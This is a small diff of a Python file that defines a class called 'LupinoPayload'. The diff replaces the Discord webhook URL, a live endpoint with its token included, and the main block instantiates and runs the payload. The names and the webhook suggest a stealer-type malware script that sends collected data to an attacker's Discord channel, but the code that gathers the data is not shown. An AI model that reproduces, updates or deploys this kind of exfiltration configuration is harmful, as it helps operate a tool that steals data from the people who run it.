@@ -16,7 +16,7 @@ import os
 __author__ = "𝕍𝕠𝕤𝕤🥷"
 __session__ = "0585f9bc8380f3137b68d2403611413392ad8bb7ce6464acd7f87456ac4740074f"
 
-webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"
+webhook = "https://discord.com/api/webhooks/1538679964357107742/gp4Fdmc-h0i3Azx90tPm9t-pRlenPKpO1dh-1uOMCxOo6XMLPcTYsSoonKViSM82FxLk"
 
 class LupinoPayload:
     """
@@ -72,3 +72,5 @@ class LupinoPayload:
 if __name__ == "__main__":
     payload = LupinoPayload()
     payload.run()
+
+
